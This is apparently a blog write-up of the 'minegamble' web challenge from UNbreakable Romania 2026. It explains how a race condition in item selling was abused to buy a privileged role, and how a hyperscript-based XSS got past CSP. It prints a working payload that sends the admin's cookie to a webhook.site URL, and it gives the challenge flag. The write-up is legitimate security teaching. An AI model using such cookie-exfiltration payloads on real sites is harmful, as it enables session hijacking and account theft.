---
layout: post
title: "minegamble"
date: 2026-06-06
categories: [Web]
difficulty: Hard
platform: UNbreakable Romania 2026
tags: [race-condition, xss, csp]
excerpt: "A race condition is used to buy the privileged role, then XSS is used to steal the admin cookie through a webhook redirect."
---

## Summary

This challenge combined a money-making race condition with a second-stage XSS issue. First, I needed enough currency to unlock the privileged role. After that, the application exposed a support flow that could be abused to deliver a payload to an admin.

The final step was cookie exfiltration under CSP, which required a payload that did not rely on a straightforward `fetch` request.

## Analysis

The race condition lived in the item-selling workflow: sending the same sell action concurrently let the same item be sold more than once. That made it possible to accumulate the money needed for the `OWNER` role much faster than intended.

Once the role was unlocked, the priority support feature became available. The admin-facing path had both a blacklist and a restrictive CSP, so a normal script injection was blocked.

The screenshots from the write-up show both the race/testing setup and the final store state:

![Race condition and rank store]({{ '/assets/img/unr26/minegamble-race.png' | relative_url }})

## Exploitation

The proof-of-concept used `hyperscript` from cdnjs, which was allowed by the policy. A minimal payload proved execution, and then a second payload created a meta refresh tag that redirected the page to a webhook while appending `document.cookie`.

Payloads from the write-up:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.14/_hyperscript.min.js"></script>
<div _="init call alert(1)"></div>
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.14/_hyperscript.min.js"></script>
<div _='
init
set c to document.cookie
set m to document.createElement("meta")
set m.httpEquiv to "refresh"
set m.content to "0; url=https://webhook.site/4c225a65-a099-420d-be30-a21d8af680db?c=" + c
append m to document.head
'></div>
```

The final webhook capture showed the cookie exfiltration:

![Webhook exfiltration]({{ '/assets/img/unr26/minegamble-webhook.png' | relative_url }})

The core idea was to use an allowed library to create behavior instead of trying to inject a blocked primitive directly.

## Flag

`CTF{232d8f9f99d0a3e440297b4aee4774c2d2e75868c6ec85d585f8410404e56cd1}`
